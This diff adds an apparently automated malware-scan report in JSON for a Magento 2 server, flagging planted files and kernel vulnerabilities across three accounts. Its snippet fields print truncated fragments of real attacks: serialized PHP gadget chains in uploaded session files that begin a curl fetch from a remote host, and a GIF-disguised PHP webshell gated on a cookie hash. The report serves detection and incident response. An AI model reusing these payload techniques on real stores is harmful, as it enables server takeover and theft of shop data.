@@ -1,0 +1,138 @@
+{
+  "scan_time": "2026-06-14T03:04:14+01:00",
+  "scanner": "sansec_ecomscan",
+  "accounts": [
+    "technadminy7",
+    "dev",
+    "tsdnd"
+  ],
+  "summary": {
+    "total_issues": 11,
+    "critical_confidence": 11,
+    "malware": 5,
+    "vulnerabilities": 6
+  },
+  "findings": [
+    {
+      "account": "technadminy7",
+      "check": "File system scan",
+      "class": "malware",
+      "name": "php_code_in_gif",
+      "description": "",
+      "path": "/home/technadminy7/public_html/pub/media/custom_options/quote/8/6/865index.php",
+      "snippet": "<?php",
+      "confidence": 100,
+      "moreinfo": ""
+    },
+    {
+      "account": "technadminy7",
+      "check": "Magento 2 uploaded session files",
+      "class": "malware",
+      "name": "uploaded_session_file",
+      "description": "",
+      "path": "/home/technadminy7/public_html/pub/media/customer_address/s/e/sess_an4c535eromiuz5vbh26n7le3crkcyai",
+      "snippet": "_|O:32:\"Monolog\\Handler\\SyslogUdpHandler\":1:{S:6:\"socket\";O:29:\"Monolog\\Handler\\BufferHandler\":7:{S:7:\"handler\";r:2;S:10:\"bufferSize\";i:-1;S:6:\"buffer\";a:1:{i:0;a:2:{i:0;S:177:\"curl https://raw.github",
+      "confidence": 100,
+      "moreinfo": "https://sansec.io/research/sessionreaper"
+    },
+    {
+      "account": "technadminy7",
+      "check": "Magento 2 uploaded session files",
+      "class": "malware",
+      "name": "uploaded_session_file",
+      "description": "",
+      "path": "/home/technadminy7/public_html/pub/media/customer_address/s/e/sess_mu0opqvtd44zbqwuzu26cxw72iyjv83e",
+      "snippet": "_|O:32:\"Monolog\\Handler\\SyslogUdpHandler\":1:{S:6:\"socket\";O:29:\"Monolog\\Handler\\BufferHandler\":7:{S:7:\"handler\";r:2;S:10:\"bufferSize\";i:-1;S:6:\"buffer\";a:1:{i:0;a:2:{i:0;S:185:\"curl https://raw.github",
+      "confidence": 100,
+      "moreinfo": "https://sansec.io/research/sessionreaper"
+    },
+    {
+      "account": "technadminy7",
+      "check": "Magento 2 uploaded session files",
+      "class": "malware",
+      "name": "uploaded_session_file",
+      "description": "",
+      "path": "/home/technadminy7/public_html/pub/media/customer_address/s/e/sess_pf2w74xeera0if1oerh02wu9zpfgv5tw",
+      "snippet": "_|O:31:\"GuzzleHttp\\Cookie\\FileCookieJar\":4:{S:7:\"cookies\";a:1:{i:0;O:27:\"GuzzleHttp\\Cookie\\SetCookie\":1:{S:4:\"data\";a:3:{S:7:\"Expires\";i:1;S:7:\"Discard\";b:0;S:5:\"Value\";S:212:\"<?php echo 409723*20;if(",
+      "confidence": 100,
+      "moreinfo": "https://sansec.io/research/sessionreaper"
+    },
+    {
+      "account": "technadminy7",
+      "check": "Magento 2 suspicious custom options uploads",
+      "class": "malware",
+      "name": "uploaded_custom_options_file",
+      "description": "",
+      "path": "/home/technadminy7/public_html/pub/media/custom_options/quote/8/6/865index.php",
+      "snippet": "GIF89a\u0001\u0000\u0001\u0000\ufffd\u0000\u0000\ufffd\ufffd\ufffd\u0000\u0000\u0000,\u0000\u0000\u0000\u0000\u0001\u0000\u0001\u0000\u0000\u0002\u0002D\u0001\u0000;<?php echo 409723*20;if(md5($_COOKIE[\"d\"])==\"\\61\\x37\\60\\62\\x38\\146\\x34\\70\\67\\143\\142\\x32\\141\\70\\x34\\x36\\x30\\67\\x36\\64\\x36\\x64\\141\\63\\141\\144\\63\\70\\67\\x38\\145\\143\"){e",
+      "confidence": 100,
+      "moreinfo": "https://sansec.io/research/magento-polyshell"
+    },
+    {
+      "account": "technadminy7",
+      "check": "Server system components",
+      "class": "vulnerability",
+      "name": "copy_fail",
+      "description": "",
+      "path": "",
+      "snippet": "",
+      "confidence": 100,
+      "moreinfo": "https://sansec.io/guides/copy-fail"
+    },
+    {
+      "account": "technadminy7",
+      "check": "Server system components",
+      "class": "vulnerability",
+      "name": "dirty_frag",
+      "description": "",
+      "path": "",
+      "snippet": "",
+      "confidence": 100,
+      "moreinfo": "https://sansec.io/guides/dirty-frag"
+    },
+    {
+      "account": "dev",
+      "check": "Server system components",
+      "class": "vulnerability",
+      "name": "copy_fail",
+      "description": "",
+      "path": "",
+      "snippet": "",
+      "confidence": 100,
+      "moreinfo": "https://sansec.io/guides/copy-fail"
+    },
+    {
+      "account": "dev",
+      "check": "Server system components",
+      "class": "vulnerability",
+      "name": "dirty_frag",
+      "description": "",
+      "path": "",
+      "snippet": "",
+      "confidence": 100,
+      "moreinfo": "https://sansec.io/guides/dirty-frag"
+    },
+    {
+      "account": "tsdnd",
+      "check": "Server system components",
+      "class": "vulnerability",
+      "name": "copy_fail",
+      "description": "",
+      "path": "",
+      "snippet": "",
+      "confidence": 100,
+      "moreinfo": "https://sansec.io/guides/copy-fail"
+    },
+    {
+      "account": "tsdnd",
+      "check": "Server system components",
+      "class": "vulnerability",
+      "name": "dirty_frag",
+      "description": "",
+      "path": "",
+      "snippet": "",
+      "confidence": 100,
+      "moreinfo": "https://sansec.io/guides/dirty-frag"
+    }
+  ]
+}
